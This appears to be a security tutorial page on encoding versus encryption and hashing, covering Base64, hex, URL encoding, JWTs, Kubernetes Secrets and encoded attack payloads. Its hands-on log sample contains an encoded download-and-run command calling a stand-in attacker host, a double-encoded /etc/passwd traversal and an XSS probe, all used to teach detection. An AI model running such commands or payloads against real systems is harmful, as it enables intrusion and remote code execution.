<Callout type="tip" title="In one minute">
**Encoding** changes how data is **written**, not who can read it. **Hex** writes each byte as two characters `0–9 a–f` (`Hi!` → `486921`). **Base64** packs every 3 bytes into 4 safe characters `A–Z a–z 0–9 + /` (`Hi!` → `SGkh`), with `=` padding at the end and about **33% more size**; **Base64url** swaps `+/` for `-_` so it's safe in URLs and JWTs. **URL encoding** (`%20`) and **HTML escaping** (`&lt;`) make text safe in a particular context. Anyone can **decode** all of these without a key. **Encryption** needs a **key** to read the data; **hashing** is one-way and can't be reversed at all. So a Base64 "password", a Kubernetes Secret or a JWT payload is **not secret**. Attackers also use encoding (sometimes twice) to hide payloads from filters, so defenders decode before they inspect.
</Callout>

## Start from zero

<Callout type="analogy">
**Encoding** is like writing a message in **Roman Urdu instead of Urdu script**: the words are the same, it's just written with different letters so another system (an English keyboard) can carry it. Anyone who knows the rule can read it back. **Encryption** is putting the message in a **locked box**: without the key, nobody can read it, even if they know exactly what kind of box it is. **Hashing** is like a **fingerprint**: it identifies the message, but you can't rebuild a person from their fingerprint.
</Callout>

### Words you need first

| Word | Simple meaning | Example |
| --- | --- | --- |
| **Byte** | 8 bits, a number from 0 to 255 | `72` (the letter H) |
| **Binary data** | Bytes that aren't readable text | an image, a key, a ZIP file |
| **Encoding** | A reversible rule for writing data in another form | Base64, hex, URL encoding |
| **Decoding** | Applying the rule backwards | `SGkh` → `Hi!` |
| **Hexadecimal (hex)** | Base 16: digits 0–9 and a–f | `ff` = 255 |
| **Base64** | Writes bytes using 64 safe characters | `SGVsbG8=` |
| **Padding** | `=` signs that fill up the last Base64 block | `SA==` |
| **Encryption** | Scrambling data so only key holders can read it | AES, RSA |
| **Hashing** | One-way fingerprint of data | SHA-256 |
| **Obfuscation** | Making something hard to read, but not secure | Base64-wrapped commands |

## What is it?

Computers store everything as **bytes**. Many systems, though, can only safely carry **text**: JSON, email, URLs, HTTP headers, YAML, HTML, terminals. Sending raw bytes through them can break things: a byte might look like a quote, a new line, or an invisible control character. Encodings solve this by **re-writing bytes using only safe characters**.

```text
              bytes (any values 0–255)
                       │
     ┌─────────────────┼──────────────────┬─────────────────────┐
     ▼                 ▼                  ▼                     ▼
    hex             Base64          URL encoding          HTML escaping
  "486921"          "SGkh"          "%3C" for <            "&lt;" for <
  2 chars/byte      4 chars/3 bytes  only unsafe chars      only unsafe chars
     │                 │                  │                     │
     └──── anyone can decode all of these: no key, no secret ───┘
```

## Why does it matter?

- **You see it everywhere:** SHA-256 hashes and Git commit IDs (hex), colours `#ff5733` (hex), JWT login tokens (Base64url), email attachments and `data:` image URLs (Base64), Kubernetes Secrets (Base64), Basic authentication headers (Base64), query strings (URL encoding).
- **Debugging:** a "garbled" value in a log or an API response is often just encoded. Recognising it saves hours.
- **The number-one misunderstanding in security:** people treat Base64 as protection. "The password is in Base64, so it's safe" is wrong, and it shows up constantly in code reviews and audits.
- **Attack and defence:** malware, phishing and web attacks hide payloads in Base64, hex and double URL encoding; analysts and WAFs must decode to see the real content.

## When and where do you use it?

| Encoding | Use it when | Examples |
| --- | --- | --- |
| Hex | Showing bytes to humans, exact and compact | hashes, keys, MAC addresses, memory/packet dumps, colours |
| Base64 | Putting binary data inside text formats | email attachments, `data:` URLs, JSON fields with files, certificates (PEM) |
| Base64url | Same, but inside URLs, filenames or tokens | JWTs, OAuth `state`/PKCE values, URL-safe IDs |
| URL encoding | Putting arbitrary text inside a URL | query strings, form submissions |
| HTML escaping | Putting text inside an HTML page | showing user comments safely |

## Concepts one by one

### 1. Everything is bytes

<Explain>
<What>
Text is stored as numbers. In UTF-8, English letters take 1 byte each; Urdu, Arabic and most other scripts take 2–4 bytes per character.
</What>
<Why>
Every encoding works on **bytes**, not on "letters". Knowing that explains why Urdu text produces longer Base64 or URL-encoded output than English.
</Why>
<When>
Whenever you encode, hash or encrypt text: you're really processing its bytes.
</When>
<Where>
`od` (on every Linux system) or `xxd`/`hexdump` show the bytes of any file or text.
</Where>
<How>
`od -An -tx1` prints bytes as hex; `-tu1` prints them as decimal numbers 0–255.
</How>
</Explain>

```bash
printf 'Hi!' | od -An -tx1
printf 'Hi!' | od -An -tu1
printf 'شکریہ' | od -An -tx1
printf 'شکریہ' | wc -c | sed 's/$/ bytes for 5 Urdu letters/'
```

```text output
 48 69 21
  72 105  33
 d8 b4 da a9 d8 b1 db 8c db 81
10 bytes for 5 Urdu letters
```

Line by line:

- `printf 'Hi!'` outputs three characters with no newline; `od -An -tx1` shows each byte in hex (`-An` hides the offset column): `48 69 21`.
- The same three bytes in decimal are `72 105 33`: the ASCII codes for `H`, `i` and `!`.
- The Urdu word "shukriya" (شکریہ, 5 letters) becomes **10 bytes** in UTF-8, two bytes per letter.

### 2. Hexadecimal

<Explain>
<What>
Hex writes each byte as **two** characters from `0–9` and `a–f` (one per 4 bits). `00` = 0, `0f` = 15, `ff` = 255.
</What>
<Why>
It's compact, exact and easy to read for humans; every byte has a fixed width, so you can count bytes by counting character pairs.
</Why>
<When>
Hashes and commit IDs, cryptographic keys, MAC addresses (`3c:22:fb:...`), colours (`#1e90ff` = red 30, green 144, blue 255), packet and memory dumps, and escape sequences like `\x41`.
</When>
<Where>
`od`/`xxd`/`hexdump` on the command line; `bytes.hex()` / `bytes.fromhex()` in Python; `Buffer.from(x).toString("hex")` in Node.
</Where>
<How>
Hex doubles the size: 32 bytes → 64 hex characters. It's case-insensitive (`FF` = `ff`).
</How>
</Explain>

```bash
printf 'Hi!' | od -An -tx1 | tr -d ' \n'; echo
python3 -c 'print(b"Hi!".hex(), bytes.fromhex("486921").decode())'
printf 'password123' | sha256sum | cut -c1-64
printf 'password123' | sha256sum | cut -d' ' -f1 | awk '{print length($0), "hex characters =", length($0)/2, "bytes"}'
```

```text output
486921
486921 Hi!
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
64 hex characters = 32 bytes
```

Line by line:

- `tr -d ' \n'` removes the spaces from `od`'s output, giving the usual compact hex string `486921`.
- In Python, `b"Hi!".hex()` encodes and `bytes.fromhex("486921").decode()` decodes back to text.
- A SHA-256 hash is 32 bytes, which `sha256sum` shows as 64 hex characters. (A hash isn't encoding: you can't get `password123` back from it. Its **display** is hex.)

### 3. Base64: how it works

<Explain>
<What>
Base64 takes the bits of 3 bytes (24 bits), splits them into four 6-bit groups, and writes each group (a number 0–63) as one character from `A–Z a–z 0–9 + /`.
</What>
<Why>
It uses only characters that survive every text system, and it's denser than hex: 4 characters per 3 bytes instead of 6.
</Why>
<When>
Binary data inside JSON, XML, email, HTTP headers, `data:` URLs, PEM certificates and keys.
</When>
<Where>
If the data isn't a multiple of 3 bytes, the last block gets `=` padding: 1 leftover byte → `==`, 2 leftover bytes → `=`.
</Where>
<How>
You'll never do this by hand, but seeing it once makes Base64 lose its mystery.
</How>
</Explain>

```bash
python3 - <<'PY'
import base64
data = b"Hi!"
bits = "".join(f"{b:08b}" for b in data)
print("bytes :", " ".join(f"{b:08b}" for b in data))
groups = [bits[i:i+6] for i in range(0, len(bits), 6)]
print("6-bit :", " ".join(groups))
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
print("values:", " ".join(str(int(g, 2)) for g in groups))
print("chars :", "".join(alphabet[int(g, 2)] for g in groups))
for text in [b"Hi!", b"Hi", b"H"]:
    print(text, "->", base64.b64encode(text).decode())
PY
```

```text output
bytes : 01001000 01101001 00100001
6-bit : 010010 000110 100100 100001
values: 18 6 36 33
chars : SGkh
b'Hi!' -> SGkh
b'Hi' -> SGk=
b'H' -> SA==
```

Line by line:

- `f"{b:08b}"` writes each byte as 8 binary digits: `H` = `01001000`, `i` = `01101001`, `!` = `00100001`.
- The 24 bits are cut into four 6-bit pieces. Each piece is a number from 0 to 63: 18, 6, 36, 33.
- Looking those numbers up in the 64-character alphabet gives `S` (18), `G` (6), `k` (36), `h` (33): **`SGkh`**, exactly what the library produces.
- `Hi` (2 bytes) doesn't fill a 3-byte block, so the output ends with one `=`; `H` (1 byte) ends with `==`. Padding tells the decoder how many real bytes the last block had.

### 4. Base64 on the command line, and its size cost

<Explain>
<What>
The `base64` command encodes, and `base64 -d` decodes. Every programming language has the same functions.
</What>
<Why>
You'll constantly decode values from configs, tokens, logs and API responses while debugging.
</Why>
<When>
Inspecting Kubernetes Secrets, JWTs, Basic auth headers, email sources, `data:` URLs.
</When>
<Where>
Linux `base64` (coreutils), macOS `base64 -D` (older versions), Python `base64`, Node `Buffer.from(x, "base64")`, browser `atob`/`btoa` (ASCII only).
</Where>
<How>
Base64 output is about **4/3 the size** of the input (33% bigger). That's why embedding big images as Base64 in HTML or JSON is usually a bad idea.
</How>
</Explain>

```bash
printf 'Hello, DevGuide' | base64
echo 'SGVsbG8sIERldkd1aWRl' | base64 -d; echo
head -c 3000 /dev/zero > image.bin
echo "3000 bytes become $(base64 -w0 image.bin | wc -c) Base64 characters"
```

```text output
SGVsbG8sIERldkd1aWRl
Hello, DevGuide
3000 bytes become 4000 Base64 characters
```

Line by line:

- `printf ... | base64` encodes the text; `base64 -d` decodes it back.
- The trailing `echo` just adds a newline after the decoded text.
- `head -c 3000 /dev/zero` creates a 3000-byte binary file (all zero bytes) as a stand-in for an image.
- `base64 -w0` encodes it on one line (`-w0` disables line wrapping at 76 characters); `wc -c` counts **4000** characters: 3000 × 4/3.

### 5. Base64url: the URL-safe variant

<Explain>
<What>
Standard Base64 uses `+`, `/` and `=`, which have special meaning in URLs and file names. **Base64url** replaces `+` with `-` and `/` with `_`, and usually drops the `=` padding.
</What>
<Why>
So encoded values can go into URLs, cookies and file names without further escaping.
</Why>
<When>
JWTs (every part of a JWT is Base64url), OAuth PKCE challenges, URL-safe random IDs and tokens.
</When>
<Where>
Python `base64.urlsafe_b64encode`; Node `Buffer.toString("base64url")`. To decode with the plain `base64` tool, swap the characters back and add the missing padding.
</Where>
<How>
A standard decoder given Base64url data often fails on `-`/`_` or missing padding, a common bug when hand-decoding tokens.
</How>
</Explain>

```bash
python3 - <<'PY'
import base64
data = bytes([251, 255, 191, 62])
print("standard :", base64.b64encode(data).decode())
print("url-safe :", base64.urlsafe_b64encode(data).decode())
print("no '='   :", base64.urlsafe_b64encode(data).decode().rstrip("="))
PY
```

```text output
standard : +/+/Pg==
url-safe : -_-_Pg==
no '='   : -_-_Pg
```

Line by line:

- These four bytes were chosen so the standard alphabet produces `+` and `/`.
- In a URL, `+` can be read as a space and `/` as a path separator, so this value would break.
- Base64url writes `-` and `_` instead, and JWTs also strip the `=` padding.

### 6. URL encoding and HTML escaping: encodings for a context

<Explain>
<What>
**URL (percent) encoding** writes unsafe characters as `%` + two hex digits (`space` → `%20`, `<` → `%3C`, `&` → `%26`). **HTML escaping** writes `< > & " '` as entities (`&lt;` …) so text is displayed instead of interpreted.
</What>
<Why>
Each format has characters with special meaning. Encoding for the **right context** keeps data as data: a `&` in a search term must not start a new URL parameter, and a `<script>` in a comment must not run.
</Why>
<When>
Building URLs and query strings; showing user-supplied text in web pages.
</When>
<Where>
Python `urllib.parse.quote` / `urlencode`, JavaScript `encodeURIComponent`, and template engines (React, Jinja, Blade) that HTML-escape automatically.
</Where>
<How>
Use the library function for the exact context. Never write your own `replace()` chain.
</How>
</Explain>

```bash
python3 - <<'PY'
from urllib.parse import quote, unquote, urlencode
import html
print(quote("price < 500 & city = Chicago/Houston"))
print(urlencode({"q": "café & chai", "page": 2}))
print(unquote("%D8%B4%DA%A9%D8%B1%DB%8C%DB%81"))
print(html.escape('<script>alert("hi")</script>'))
PY
```

```text output
price%20%3C%20500%20%26%20city%20%3D%20Chicago/Houston
q=caf%C3%A9+%26+chai&page=2
شکریہ
&lt;script&gt;alert(&quot;hi&quot;)&lt;/script&gt;
```

Line by line:

- `quote` turns spaces into `%20`, `<` into `%3C`, `&` into `%26` and `=` into `%3D`. It leaves `/` alone by default because it's usually part of a path (`quote(x, safe="")` encodes it too).
- `urlencode` builds a complete query string: `é` becomes its two UTF-8 bytes `%C3%A9`, the space in a form value becomes `+`, and the real `&` inside the value is encoded so it doesn't split the parameters.
- `unquote` decodes the UTF-8 bytes of the Urdu word from concept 1 back into text.
- `html.escape` turns a script tag into harmless text that a browser **shows** instead of running. That's the core of preventing XSS.

### 7. A JWT is readable by anyone

<Explain>
<What>
A **JWT** (JSON Web Token) has three Base64url parts separated by dots: `header.payload.signature`. The header and payload are just encoded JSON.
</What>
<Why>
Many developers assume tokens are encrypted. They're **signed**, not encrypted: the signature proves nobody changed the payload, but anyone holding the token can **read** it.
</Why>
<When>
Login sessions, API access tokens, OAuth/OpenID Connect ID tokens.
</When>
<Where>
Browser storage, `Authorization: Bearer ...` headers, logs (a common leak), jwt.io for inspection.
</Where>
<How>
Never put secrets or sensitive personal data in a JWT payload. If the content must be hidden, use encrypted tokens (JWE) or keep the data on the server.
</How>
</Explain>

```bash
python3 - <<'PY'
import base64, hmac, hashlib, json
def b64url(raw): return base64.urlsafe_b64encode(raw).decode().rstrip("=")
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(json.dumps({"sub": "1042", "name": "Olivia", "role": "user", "exp": 1794326400}, separators=(",", ":")).encode())
signature = b64url(hmac.new(b"server-secret", f"{header}.{payload}".encode(), hashlib.sha256).digest())
token = f"{header}.{payload}.{signature}"
open("token.txt", "w").write(token)
print(token[:60] + "...")
PY
echo "--- decode the payload without any key:"
cut -d. -f2 token.txt | tr '_-' '/+' | base64 -d 2>/dev/null; echo
python3 - <<'PY'
import base64, json
part = open("token.txt").read().split(".")[1]
part += "=" * (-len(part) % 4)
print(json.loads(base64.urlsafe_b64decode(part)))
PY
```

```text output
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQyIiwibmF...
--- decode the payload without any key:
{"sub":"1042","name":"Olivia","role":"user","exp":1794326400}
{'sub': '1042', 'name': 'Olivia', 'role': 'user', 'exp': 1794326400}
```

Line by line:

- The first script builds a real HS256 JWT the way a server does: Base64url-encode the header JSON and payload JSON, then sign `header.payload` with HMAC-SHA256 using the server's secret, and Base64url-encode the signature.
- Every JWT starts with `eyJ`, which is simply the Base64 of `{"`. Learn to recognise it.
- `cut -d. -f2` takes the payload part; `tr '_-' '/+'` converts Base64url back to standard Base64, and `base64 -d` decodes it. (`2>/dev/null` hides a warning about the missing padding.)
- The Python version adds the missing `=` padding (`-len(part) % 4` computes how many) and parses the JSON properly.
- No key was needed to read the user ID, name and role. The secret only matters for **creating or verifying** the signature (see **Digital Signatures** in Cryptography Basics).

### 8. Kubernetes Secrets are only Base64

<Explain>
<What>
Kubernetes `Secret` objects store values in Base64 under `data:`. That's an encoding, not encryption.
</What>
<Why>
Base64 lets Secrets hold binary data such as keys and certificates. It provides **no** confidentiality: anyone who can read the YAML (in Git, in a backup, or via `kubectl get secret -o yaml`) can read the password.
</Why>
<When>
Every time a Secret manifest is committed, shared or printed.
</When>
<Where>
Protect Secrets with RBAC (who may read them), encryption at rest in etcd, and tools like Sealed Secrets, SOPS or External Secrets so plaintext never lands in Git.
</Where>
<How>
Decoding takes one command, as shown below.
</How>
</Explain>

```bash
cat > secret.yaml <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: c2hvcA==
  password: UzNjdXJlUEBzczIwMjY=
EOF
grep -E '^\s+(username|password):' secret.yaml | while read -r key value; do
  echo "${key%:} = $(echo "$value" | base64 -d)"
done
```

```text output
username = shop
password = S3cureP@ss2026
```

Line by line:

- The YAML looks "protected" because the values are unreadable at a glance.
- `grep -E` selects the two data lines; `while read -r key value` splits each into the key (with its colon) and the value.
- `${key%:}` removes the trailing colon, and `base64 -d` decodes the value. The real database password appears in plain text.
- In a real cluster the same thing is `kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d`.

### 9. Encoding vs encryption vs hashing

<Explain>
<What>
Three different jobs. **Encoding**: change the representation; reversible by anyone. **Encryption**: hide the content; reversible only **with the key**. **Hashing**: create a fixed-size fingerprint; **not** reversible.
</What>
<Why>
Mixing them up causes real vulnerabilities: "encrypting" passwords with Base64, "hashing" data you need to read back, or storing passwords with reversible encryption.
</Why>
<When>
Encoding for transport and formatting; encryption for confidentiality (files, databases, network traffic); hashing for integrity checks and password storage (with special slow hashes, see **Password Storage: Salting and Slow Hashes**).
</When>
<Where>
Base64/hex/URL encoding; AES and ChaCha20 (symmetric) and RSA/ECC (asymmetric) encryption; SHA-256 (integrity), bcrypt and Argon2 (passwords).
</Where>
<How>
Ask: "Does reading this need a secret?" If not, it's encoding, not protection.
</How>
</Explain>

```bash
printf 'Transfer Rs 50000 to Sam' > message.txt
echo "encoded  : $(base64 message.txt)"
echo "decoded  : $(base64 message.txt | base64 -d)"
openssl enc -aes-256-cbc -pbkdf2 -S 0102030405060708 -pass pass:CorrectHorse -in message.txt -out message.enc
echo "encrypted: $(base64 -w0 message.enc)"
echo "wrong key: $(openssl enc -d -aes-256-cbc -pbkdf2 -S 0102030405060708 -pass pass:WrongGuess -in message.enc 2>&1 | head -1)"
echo "right key: $(openssl enc -d -aes-256-cbc -pbkdf2 -S 0102030405060708 -pass pass:CorrectHorse -in message.enc)"
echo "hashed   : $(sha256sum message.txt | cut -c1-16)... (one-way: there is no 'decrypt')"
```

```text output
encoded  : VHJhbnNmZXIgUnMgNTAwMDAgdG8gU2Ft
decoded  : Transfer Rs 50000 to Sam
encrypted: g9ogTuAwmy1+UtAN1H4DWUpeXWeNctY6DuvjwkQjTME=
wrong key: bad decrypt
right key: Transfer Rs 50000 to Sam
hashed   : f34a5cb9da8b0ef8... (one-way: there is no 'decrypt')
```

Line by line:

- **Encoding:** `base64` changes the look; `base64 -d` gets the message back. No secret involved.
- **Encryption:** `openssl enc -aes-256-cbc` encrypts with AES-256. `-pbkdf2` turns the password `CorrectHorse` into a key properly, and `-S` sets a fixed salt only so this example gives the same output every time. Normally the salt is random and stored with the ciphertext.
- The ciphertext is binary, so we **Base64-encode it to display it**. Encoding and encryption often work together: encryption protects, encoding transports.
- With the wrong password, decryption fails (`bad decrypt`); with the right one, the message comes back.
- **Hashing:** SHA-256 produces a fingerprint. There's no command to turn it back into the message.

| | Encoding | Encryption | Hashing |
| --- | --- | --- | --- |
| Purpose | Represent data safely in another format | Keep data secret | Fingerprint / verify data |
| Reversible? | Yes, by anyone | Yes, only with the key | No |
| Needs a key? | No | Yes | No (HMAC uses a key for authenticity) |
| Output size | Grows (hex ×2, Base64 ×4/3) | About the same as the input | Fixed (SHA-256: 32 bytes) |
| Examples | Base64, hex, URL, HTML entities | AES-GCM, ChaCha20, RSA | SHA-256, bcrypt, Argon2 |
| Wrong use | "Securing" passwords with Base64 | Storing user passwords encrypted | Using MD5/SHA-256 alone for passwords |

### 10. Encoding as camouflage: how attackers use it

<Explain>
<What>
Attackers encode payloads so simple filters and human reviewers don't recognise them: Base64-wrapped shell commands, PowerShell's `-EncodedCommand` (Base64 of UTF-16LE text), hex-encoded strings, and **double URL encoding** (`%252e` → `%2e` → `.`).
</What>
<Why>
A filter that blocks `../` or `<script>` but checks the input **before** the application decodes it can be bypassed. Encoded commands also hide in scripts, phishing documents and logs.
</Why>
<When>
Web attacks against WAFs and validation, malware droppers, suspicious cron jobs and CI steps, phishing attachments.
</When>
<Where>
Defenders decode in SIEM rules, use CyberChef ("the cyber Swiss army knife") for manual analysis, and **canonicalise** input (decode fully, once, in one place) before validating it.
</Where>
<How>
Below, a PowerShell-style encoded command is created and decoded. Note the UTF-16LE encoding: every character is followed by a zero byte, which is why such strings contain lots of `A`s.
</How>
</Explain>

```bash
python3 -c 'import base64; print(base64.b64encode("Write-Output \"downloading payload\"".encode("utf-16-le")).decode())'
python3 -c 'import base64; print(base64.b64decode("VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGQAbwB3AG4AbABvAGEAZABpAG4AZwAgAHAAYQB5AGwAbwBhAGQAIgA=").decode("utf-16-le"))'
```

```text output
VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGQAbwB3AG4AbABvAGEAZABpAG4AZwAgAHAAYQB5AGwAbwBhAGQAIgA=
Write-Output "downloading payload"
```

Line by line:

- `.encode("utf-16-le")` turns the text into UTF-16 little-endian bytes (2 bytes per character, the second being zero for English letters), which is the format PowerShell expects for `-EncodedCommand`.
- The Base64 result has the telltale pattern `...AGkAdABlAC0A...`: those `A`s come from the zero bytes. Seeing `powershell -enc` followed by such a string in a log is a classic indicator of malicious activity.
- Decoding with `.decode("utf-16-le")` reveals the actual command. Real attacks hide download-and-execute commands this way.

## Hands-on

Decode suspicious values from a web server log automatically, including values encoded more than once:

```bash
cat > suspicious.log <<'EOF'
10.0.0.5 GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
10.0.0.9 POST /api/run?cmd=Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3NoZWxsLnNoIHwgYmFzaA==
10.0.0.9 GET /download?file=%252e%252e%252fetc%252fpasswd
10.0.0.7 GET /item?id=6f726465722d31303432
EOF
python3 - <<'PY'
import base64, binascii, re
from urllib.parse import unquote

def try_decode(value):
    steps = []
    for _ in range(5):                                   # at most 5 layers
        if "%" in value and unquote(value) != value:
            value = unquote(value); steps.append(("url", value)); continue
        if re.fullmatch(r"(?:[0-9a-fA-F]{2}){4,}", value):
            try:
                value = bytes.fromhex(value).decode(); steps.append(("hex", value)); continue
            except UnicodeDecodeError:
                pass
        if re.fullmatch(r"[A-Za-z0-9+/]{8,}={0,2}", value) and len(value) % 4 == 0:
            try:
                value = base64.b64decode(value, validate=True).decode(); steps.append(("base64", value)); continue
            except (binascii.Error, UnicodeDecodeError):
                pass
        break
    return steps

for line in open("suspicious.log"):
    ip, method, target = line.split()
    raw = target.split("=", 1)[1]
    print(f"{ip}  {method:4} {raw[:40]}")
    for kind, text in try_decode(raw):
        print(f"      {kind:6} -> {text}")
PY
```

```text output
10.0.0.5  GET  %3Cscript%3Ealert(1)%3C%2Fscript%3E
      url    -> <script>alert(1)</script>
10.0.0.9  POST Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3NoZWxs
      base64 -> curl http://evil.example/shell.sh | bash
10.0.0.9  GET  %252e%252e%252fetc%252fpasswd
      url    -> %2e%2e%2fetc%2fpasswd
      url    -> ../etc/passwd
10.0.0.7  GET  6f726465722d31303432
      hex    -> order-1042
```

Line by line:

- Each log line has an IP, a method and a URL with one parameter; `target.split("=", 1)[1]` takes the parameter's value.
- `try_decode` repeatedly tries to peel off one layer of encoding, up to 5 layers, and records each step:
  - **URL encoding** if there's a `%` and decoding changes something.
  - **Hex** if the value is only pairs of hex digits (at least 4 bytes) that decode to valid text.
  - **Base64** if it uses only Base64 characters, has a length divisible by 4, and decodes to valid text. `validate=True` rejects stray characters.
- Results:
  - **10.0.0.5:** a URL-encoded **XSS** attempt (`<script>`).
  - **10.0.0.9 (POST):** Base64 hiding a **command injection** that downloads and runs a shell script.
  - **10.0.0.9 (GET):** **double** URL encoding (`%25` is an encoded `%`) hiding a **path traversal** to `/etc/passwd`. A filter that decodes only once would see `%2e%2e%2f` and miss it.
  - **10.0.0.7:** harmless: a hex-encoded order ID. Decoding shows what's really there, malicious or not.
- The same attacker IP (`10.0.0.9`) appears in two attacks, which is worth investigating further.

## Real-world example

During a code review at a payments startup, a security engineer finds this in a mobile app's source: `const API_KEY = atob("c2tfbGl2ZV81MWg...")`. The developer explains the key is "encrypted". It's Base64: decoding it gives a **live payment-provider secret key**, and anyone who downloads the app can extract it in seconds. The team rotates the key immediately, moves all calls that need the secret to their backend (the app only gets short-lived, limited tokens from the backend), and adds a gitleaks rule plus a CI check that flags `atob(`/`base64` near words like `key` or `secret`.

A month later, the SOC sees `powershell.exe -nop -w hidden -enc JABjAD0A...` on an employee laptop. Decoding the UTF-16LE Base64 in CyberChef reveals a command downloading malware from a lookalike domain, delivered through a phishing Excel file. The encoded string itself becomes an indicator the team searches for across all machines.

## Common mistakes

- **Thinking Base64 is encryption** ("encrypted" API keys, passwords, tokens or Kubernetes Secrets).
- **Putting sensitive data in JWT payloads,** assuming nobody can read them.
- **Decoding Base64url with a standard decoder** and getting errors because of `-`, `_` or missing padding.
- **Forgetting the text encoding:** Base64 gives **bytes**; decoding them as the wrong character set (UTF-8 vs UTF-16LE) produces garbage.
- **Embedding large files as Base64** in JSON or HTML: 33% bigger, slower, and not cached separately.
- **Writing your own URL or HTML escaping** with `replace()` instead of the library function for that context.
- **Validating input before decoding it** (or decoding it twice in different places), which opens double-encoding bypasses.
- **Using hex or Base64 "obfuscation"** to hide secrets in front-end code or apps.

## Security lens

<Callout type="security">
If it can be decoded without a key, it is not protected. Encode for transport, encrypt for secrecy, hash for verification.
</Callout>

- **Secrets:** treat any Base64-encoded secret as plaintext. Store secrets in secret managers and encrypt them at rest.
- **Tokens:** JWT payloads are public. Verify the signature and algorithm on the server, keep payloads minimal, and avoid sensitive personal data.
- **Canonicalisation:** decode input fully into its canonical form **once**, then validate it. Inconsistent decoding between a WAF, a proxy and the app is a classic bypass.
- **Output encoding:** encode for the exact output context (HTML body, HTML attribute, JavaScript, URL, SQL via parameters). Context-aware output encoding is the main defence against XSS.
- **Detection:** decode Base64, hex and UTF-16LE strings in logs and scripts; look for long encoded blobs in command lines (`-enc`, `base64 -d | bash`, `FromBase64String`, `eval(atob(...))`).
- **Data exposure:** Base64 in URLs and logs (Basic auth headers, tokens) is still sensitive data. Mask it in logs.

## Interview questions

<QA q="What is the difference between encoding, encryption and hashing?">
Encoding transforms data into another representation for compatibility, such as Base64 or URL encoding, and anyone can reverse it without a key. Encryption transforms data so that only someone with the right key can recover it, providing confidentiality. Hashing produces a fixed-size fingerprint that cannot be reversed and is used for integrity checks and, with slow salted algorithms, for password storage.
</QA>

<QA q="How does Base64 work and why is the output larger than the input?">
Base64 splits the input into groups of three bytes, or 24 bits, divides them into four 6-bit values and maps each value to one of 64 printable characters, adding equals-sign padding when the last group is incomplete. Because every three bytes become four characters, the output is about 33 percent larger.
</QA>

<QA q="Is a JWT encrypted?">
A standard JWT is signed, not encrypted. Its header and payload are Base64url-encoded JSON that anyone holding the token can decode and read. The signature only ensures the token was issued by someone with the key and has not been modified. Sensitive data should not be put in the payload, or an encrypted JWE should be used.
</QA>

<QA q="Are Kubernetes Secrets secure because their values are Base64-encoded?">
No. Base64 is only an encoding and can be decoded by anyone who can read the Secret. Protection comes from RBAC restricting who can read Secrets, encryption at rest in etcd, and keeping plaintext Secrets out of Git with tools such as Sealed Secrets, SOPS or an external secret manager.
</QA>

<QA q="What is double encoding and why does it matter for security?">
Double encoding encodes already encoded data again, for example a percent sign itself encoded as %25 so that %252e becomes %2e and then a dot. If a security filter decodes input once but the application decodes it again later, attackers can slip payloads such as path traversal sequences past the filter. Input should be canonicalised fully once before validation.
</QA>

## Key terms

<Terms>
  <Term name="Encoding">Reversible change of representation, without a key.</Term>
  <Term name="Hexadecimal">Base-16 representation, two characters per byte.</Term>
  <Term name="Base64">Encoding of 3 bytes into 4 printable characters.</Term>
  <Term name="Padding">Trailing = characters completing the last Base64 block.</Term>
  <Term name="Base64url">URL-safe Base64 using - and _ and usually no padding.</Term>
  <Term name="URL encoding">Percent-encoding of unsafe URL characters, e.g. %20.</Term>
  <Term name="HTML escaping">Replacing special HTML characters with entities like &amp;lt;.</Term>
  <Term name="Encryption">Key-based transformation that keeps data confidential.</Term>
  <Term name="Hashing">One-way fixed-size fingerprint of data.</Term>
  <Term name="Double encoding">Encoding data twice to evade filters.</Term>
  <Term name="Canonicalisation">Decoding input into a single standard form before validation.</Term>
</Terms>
